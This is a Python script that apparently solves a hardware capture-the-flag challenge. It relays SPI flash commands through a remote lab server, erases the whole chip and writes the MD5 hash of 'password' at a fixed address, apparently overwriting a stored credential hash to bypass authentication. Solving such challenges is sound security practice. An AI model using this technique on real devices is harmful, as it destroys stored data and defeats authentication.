import socket
import json
import time


# --------------------
# Lightly edited starter source
# --------------------

def _exchange(host, port, hex_list, value):

    cs=0 # /CS on A*BUS3 (range: A*BUS3 to A*BUS7)

    usb_device_url = 'ftdi://ftdi:2232h/1'

    # Convert hex list to strings and prepare the command data
    command_data = {
        "tool": "pyftdi",
        "cs_pin":  cs,
        "url":  usb_device_url,
        "data_out": [hex(x) for x in hex_list],  # Convert hex numbers to hex strings
        "readlen": value
    }

    data = b''

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))

        # Serialize data to JSON and send
        s.sendall(json.dumps(command_data).encode('utf-8'))

        # Receive and process response
        while True:
            data += s.recv(1024)

            if data.endswith(b']'):
                break

    time.sleep(1)
    return data

# --------------------
# Tools for solution (involved remote servers)
# --------------------

def exchange(hex_list, value=0):
    host = '83.136.255.40'
    port = 40656
    return _exchange(host, port, hex_list, value)

def read():
    print(exchange([0x03], 3000))

def read_status_reg():
    print(exchange([0x05], 1))

def write_enable():
    exchange([0x06])

def chip_erase():
    exchange([0xC7])

def page_program(address, byts):
    # Aka write
    write_enable()
    exchange([0x02] + address + byts)

def erase_chip():
    write_enable()
    chip_erase()

hash_address = [0x00, 0x04, 0x00]

erase_chip()
page_program(hash_address, [0x00, 0x5f, 0x4d, 0xcc, 0x3b, 0x5a, 0xa7, 0x65, 0xd6, 0x1d, 0x83, 0x27, 0xde, 0xb8, 0x82, 0xcf, 0x99, 0x00])
read()
